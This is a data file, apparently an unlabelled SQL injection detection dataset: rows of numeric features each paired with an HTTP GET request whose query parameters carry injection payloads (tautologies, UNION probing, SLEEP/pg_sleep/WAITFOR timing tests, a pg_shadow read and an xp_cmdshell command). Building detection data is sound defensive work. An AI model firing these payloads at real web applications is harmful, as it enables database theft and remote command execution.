87,2,200,5049,39,11,17,2,1,GET ?mail=RANDOMBLOB(500000000/2)&pass=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)# HTTP/1.1
42,1,200,5277,7,16,9,1,1,GET ?account=1)) or pg_sleep(5)-- HTTP/1.1
72,2,200,3428,30,11,20,1,1,GET ?name=' or ''*'&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX' HTTP/1.1
33,1,200,3573,12,8,7,1,1,GET ?password=SLEEP(5)-- HTTP/1.1
43,2,200,6456,14,8,7,1,1,GET ?mail= ORDER BY 12-- &pass=" " HTTP/1.1
61,1,200,6883,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2--  HTTP/1.1
54,2,200,7196,7,15,19,1,1,GET ?email=' or ''^'&pass=")) or (("x"))=(("x HTTP/1.1
211,1,200,2153,98,7,40,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112))) HTTP/1.1
164,1,200,7331,46,7,16,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
164,1,200,7254,46,7,16,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
92,1,200,6893,46,8,15,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5 HTTP/1.1
92,1,200,1588,46,8,15,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5 HTTP/1.1
119,1,200,4437,46,8,16,1,1,GET ?password= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
241,1,200,5154,110,4,48,1,1,GET ?pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
241,1,200,4990,110,4,48,1,1,GET ?pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
241,1,200,6724,110,4,48,1,1,GET ?pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
58,2,200,6511,12,17,18,1,1,GET ?email=admin') or ('1'='1'--&phone=SLEEP(5)=" HTTP/1.1
48,1,200,1389,19,7,7,2,1,GET login/?id= ORDER BY 1_SLEEP(5)_3--  HTTP/1.1
86,1,200,4955,31,2,11,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12 HTTP/1.1
62,1,200,6278,30,4,13,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4 HTTP/1.1
139,2,200,3401,38,10,16,1,1,GET ?email= ORDER BY 23-- &phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
109,1,200,7327,21,5,5,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26--  HTTP/1.1
122,1,200,3081,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
104,1,200,1821,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
104,1,200,3099,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
45,2,200,6246,7,16,10,1,1,GET ?name=") or sleep(5)="&phone="^" HTTP/1.1
79,1,200,5912,39,12,16,1,1,GET ?phone=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe HTTP/1.1
79,1,200,2995,39,12,16,1,1,GET ?phone=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe HTTP/1.1
76,1,200,1426,31,4,13,1,1,GET ?user= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
240,2,200,7589,92,11,29,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
83,2,200,4416,38,6,7,1,1,GET ?id= AS INJECTX WHERE 1=1 AND 1=1&pass= UNION ALL SELECT 1_2_3_4_5_6_7 HTTP/1.1
29,1,200,5410,7,9,6,1,1,GET ?email= like '%' HTTP/1.1
96,2,200,1686,31,13,16,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6#&pass=" or "1"="1"# HTTP/1.1
150,2,200,1568,45,8,13,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23&pass= UNION ALL SELECT 1_2_3 HTTP/1.1
31,1,200,3433,7,9,8,1,1,GET ?account=' or ''^' HTTP/1.1
31,1,200,7544,7,9,8,1,1,GET ?account=' or ''^' HTTP/1.1
84,2,200,3508,11,28,15,1,1,GET ?code=benchmark(10000000_MD5(1))#&code=" or benchmark(10000000_MD5(1))# HTTP/1.1
195,2,200,2883,53,21,22,1,1,GET ?id=' GROUP BY columnnames having 1=1 --&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
37,1,200,6610,15,4,5,1,1,GET ?user= WHERE 1=1 AND 1=1 HTTP/1.1
36,1,200,1261,7,12,6,1,1,GET ?username=") or ("a"="a HTTP/1.1
36,1,200,2822,7,12,6,1,1,GET ?username=") or ("a"="a HTTP/1.1
145,2,200,2250,31,13,23,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22#&phone=")) or (("x"))=(("x HTTP/1.1
30,1,200,7832,7,7,6,1,1,GET ?phone=" or 1=1-- HTTP/1.1
79,2,200,6598,30,9,17,1,1,GET ?tel= or 1=1&name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6# HTTP/1.1
177,2,200,3072,60,10,19,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13#&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17# HTTP/1.1
106,2,200,5689,31,21,21,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6-- &pass=1)) or pg_sleep(5)-- HTTP/1.1
29,2,200,7136,7,7,4,1,1,GET ?email=" or ""&" HTTP/1.1
47,2,200,6594,14,12,10,1,1,GET ?email= ORDER BY 5-- &phone='="or' HTTP/1.1
58,2,200,6084,23,9,9,1,1,GET ?name= ORDER BY 27 &tel=' AnD SLEEP(5) ANd '1 HTTP/1.1
110,2,200,1884,28,8,8,1,1,GET ?code= ORDER BY 29# &code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
203,1,200,4376,137,4,17,1,1,GET ?user= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
203,1,200,7107,137,4,17,1,1,GET ?user= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
95,2,200,1496,38,9,13,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7&phone= ORDER BY 27  HTTP/1.1
263,2,200,3589,110,16,55,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))&phone=admin' or '1'='1'# HTTP/1.1
65,1,200,2466,30,4,14,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5# HTTP/1.1
65,1,200,7019,30,4,14,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5# HTTP/1.1
88,2,200,6485,28,9,7,1,1,GET ?email= ORDER BY 17-- &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
129,2,200,1933,46,20,27,1,1,GET ?mail= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9&pass='));waitfor delay '0:0:5'-- HTTP/1.1
87,2,200,7967,30,13,21,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6&pass=admin') or '1'='1 HTTP/1.1
140,2,200,6300,30,17,19,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &code=admin"or 1=1 or ""=" HTTP/1.1
27,1,200,1960,7,9,5,1,1,GET ?user=admin' # HTTP/1.1
27,1,200,7722,7,9,5,1,1,GET ?user=admin' # HTTP/1.1
27,1,200,1703,7,9,5,1,1,GET ?user=admin' # HTTP/1.1
70,1,200,1715,21,5,3,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
70,1,200,2386,21,5,3,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
110,2,200,7387,31,13,15,1,1,GET ?tel= or true&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
121,2,200,5261,33,18,23,1,1,GET ?tel=')) or benchmark(10000000_MD5(1))#&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9--  HTTP/1.1
37,1,200,1011,7,13,7,1,1,GET ?mail=1 or pg_sleep(5)-- HTTP/1.1
161,2,200,4365,31,11,17,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29#&phone=") or "1"="1"# HTTP/1.1
55,2,200,7399,9,28,7,1,1,GET ?account= OR 1=0&pass=select current_user; HTTP/1.1
57,2,200,1234,10,19,10,1,1,GET ?username=admin") or "1"="1"--&pass= AND 1=1 HTTP/1.1
77,1,200,5930,31,4,11,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8 HTTP/1.1
77,1,200,1701,31,4,11,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8 HTTP/1.1
153,2,200,3565,73,26,21,1,1,GET ?code=select * from pg_shadow;&code= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
48,2,200,1466,7,14,15,3,1,GET ?tel=admin') or ('1'='1'/*&name="/* HTTP/1.1
30,1,200,4474,13,4,4,1,1,GET ?code= HAVING 1=1 HTTP/1.1
134,1,200,1406,46,7,16,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
109,1,200,1121,21,8,5,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25--  HTTP/1.1
49,2,200,4073,13,9,14,1,1,GET ?tel= HAVING 1=1#&name=') or ('1'='1 HTTP/1.1
41,1,200,1993,7,12,12,2,1,GET ?phone=admin') or ('1'='1'/* HTTP/1.1
41,1,200,6190,7,12,12,2,1,GET ?phone=admin') or ('1'='1'/* HTTP/1.1
52,2,200,6040,7,14,19,1,1,GET ?id=') or '1'='1'--&id=' or 'one'='one– HTTP/1.1
56,1,200,5404,21,8,3,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8 HTTP/1.1
56,1,200,4651,21,8,3,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8 HTTP/1.1
56,1,200,7180,21,8,3,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8 HTTP/1.1
53,2,200,1379,7,18,17,1,1,GET ?account=' and a='a&pass=') or ('1'='1-- HTTP/1.1
37,1,200,2695,14,8,4,1,1,GET ?password= ORDER BY 21#  HTTP/1.1
37,1,200,7064,14,8,4,1,1,GET ?password= ORDER BY 21#  HTTP/1.1
61,1,200,7039,7,30,12,1,1,GET ?pass= and (select substring(@@version_3_1))='c' HTTP/1.1
83,1,200,1860,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9--  HTTP/1.1
83,1,200,7745,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9--  HTTP/1.1
46,2,200,5715,7,17,8,1,1,GET ?code=admin" or 1=1#&code= or 1=1 HTTP/1.1
27,1,200,7369,7,7,5,1,1,GET ?phone=or 1=1# HTTP/1.1
195,2,200,6148,54,8,27,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25-- &code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10--  HTTP/1.1
32,1,200,3233,7,10,8,1,1,GET ?username=' or ''-' HTTP/1.1
32,1,200,6899,7,10,8,1,1,GET ?username=' or ''-' HTTP/1.1
81,2,200,6153,30,7,19,1,1,GET ?id=' and 1='1&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7# HTTP/1.1
100,1,200,6418,46,8,15,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
109,1,200,3740,30,5,13,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
112,1,200,6399,31,4,11,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20 HTTP/1.1
34,1,200,4137,14,5,5,1,1,GET ?email= ORDER BY 8--  HTTP/1.1
111,1,200,4900,30,4,13,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
75,2,200,3334,33,11,15,1,1,GET ?name=AND true&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4 HTTP/1.1
128,2,200,6014,31,25,17,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14&id=' group by password having 1=1-- HTTP/1.1
62,2,200,4725,19,9,15,1,1,GET ?name=") or "1"="1&tel=';WAITFOR DELAY '0:0:30'-- HTTP/1.1
121,1,200,6046,21,8,5,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
121,1,200,1818,21,8,5,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
101,1,200,2754,21,2,4,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
101,1,200,5143,21,2,4,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
101,1,200,4835,21,2,4,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
224,2,200,2407,80,12,28,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))#&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
35,3,200,7778,9,9,10,1,1,GET ?phone='&'&id= OR x=y# HTTP/1.1
30,1,200,2334,10,4,6,1,1,GET ?mail= AND 1=1--  HTTP/1.1
32,1,200,6209,7,6,10,1,1,GET ?mail=') or ('1'='1 HTTP/1.1
55,2,200,7908,7,19,15,1,1,GET ?email=admin' or '1'='1'#&phone= or 0=0 -- HTTP/1.1
236,2,200,2888,85,7,30,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16#&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
113,1,200,1267,31,7,11,2,1,GET login/?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
63,2,200,2063,10,22,13,1,1,GET ?email=waitfor delay '00:00:05'#&phone= AND 1=1--  HTTP/1.1
118,2,200,5206,30,15,19,2,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17#&pass=admin' or 1=1/* HTTP/1.1
62,1,200,2338,7,31,12,1,1,GET ?phone= and (select substring(@@version_2_1))='i' HTTP/1.1
62,1,200,1818,7,31,12,1,1,GET ?phone= and (select substring(@@version_2_1))='i' HTTP/1.1
91,1,200,4854,30,8,13,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
219,2,200,6361,60,9,17,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
275,2,200,3470,164,7,29,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12&tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
35,1,200,7151,7,11,8,1,1,GET ?user=admin' or '1'='1 HTTP/1.1
127,1,200,1682,62,7,23,2,1,GET login/?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))# HTTP/1.1
97,2,200,5981,21,10,9,1,1,GET ?mail= or 1=1--&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18# HTTP/1.1
121,1,200,3827,46,8,15,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
91,2,200,6480,44,7,16,1,1,GET ?phone= UNION ALL SELECT 1&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6# HTTP/1.1
43,1,200,4168,7,16,9,2,1,GET login/?id=1)) or pg_sleep(5)-- HTTP/1.1
43,1,200,6345,7,16,9,2,1,GET login/?id=1)) or pg_sleep(5)-- HTTP/1.1
83,1,200,1230,38,7,14,3,1,GET login/?id=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
58,2,200,7394,14,14,12,1,1,GET ?tel=admin' or '1'='1'#&name= ORDER BY 31337  HTTP/1.1
57,2,200,4231,21,9,10,1,1,GET ?tel= UNION ALL SELECT 1_2#&name=' or '1′='1 HTTP/1.1
32,1,200,4480,14,5,3,1,1,GET ?email= ORDER BY 4  HTTP/1.1
32,1,200,3018,14,5,3,1,1,GET ?email= ORDER BY 4  HTTP/1.1
119,2,200,4748,36,25,14,1,1,GET ?phone=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055&id= ORDER BY SLEEP(5)--  HTTP/1.1
146,2,200,3245,53,4,19,1,1,GET ?id= ORDER BY 28# &id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
94,2,200,3919,43,6,20,2,1,GET ?id=pg_SLEEP(5)--&id=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1
42,1,200,1358,7,15,5,2,1,GET ?username=admin" or "1"="1"/* HTTP/1.1
42,1,200,7364,7,15,5,2,1,GET ?username=admin" or "1"="1"/* HTTP/1.1
47,2,200,1191,7,20,9,1,1,GET ?mail=1 or sleep(5)#&pass=admin" # HTTP/1.1
180,1,200,4605,86,5,34,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69))) HTTP/1.1
59,2,200,7142,24,9,9,1,1,GET ?email= AS INJECTX WHERE 1=1 AND 1=1#&pass="*" HTTP/1.1
51,1,200,4539,24,5,7,1,1,GET ?email= AS INJECTX WHERE 1=1 AND 1=0-- HTTP/1.1
50,2,200,6875,14,11,10,1,1,GET ?email= ORDER BY 3# &pass=' or '1′='1 HTTP/1.1
214,2,200,7486,129,10,28,1,1,GET ?code=') or ('1'='1--&code= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
54,1,200,4344,7,32,8,1,1,GET ?username=select current_setting('port'); HTTP/1.1
115,2,200,7950,46,12,19,1,1,GET ?name=admin' #&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11 HTTP/1.1
121,2,200,6231,46,12,18,1,1,GET ?username=-1 UNION SELECT 1 INTO @_@&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10--  HTTP/1.1
273,2,200,4158,113,7,52,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65)))-- &tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
65,2,200,7808,7,34,15,1,1,GET ?name=') or ('x'='x&phone=select current_database(); HTTP/1.1
60,2,200,5018,21,14,10,1,1,GET ?name=")) or sleep(5)="&tel= UNION ALL SELECT 1 HTTP/1.1
234,2,200,6153,90,38,42,2,1,GET ?tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65)))&name=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
47,2,200,4262,14,14,7,2,1,GET ?name=admin'/*&phone= ORDER BY 15  HTTP/1.1
91,2,200,2627,37,8,18,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7-- &code= ORDER BY 22#  HTTP/1.1
248,2,200,5576,111,12,48,1,1,GET ?code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))&code=or pg_SLEEP(5) HTTP/1.1
155,2,200,6088,23,20,11,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30#&phone=or benchmark(50000000_MD5(1))# HTTP/1.1
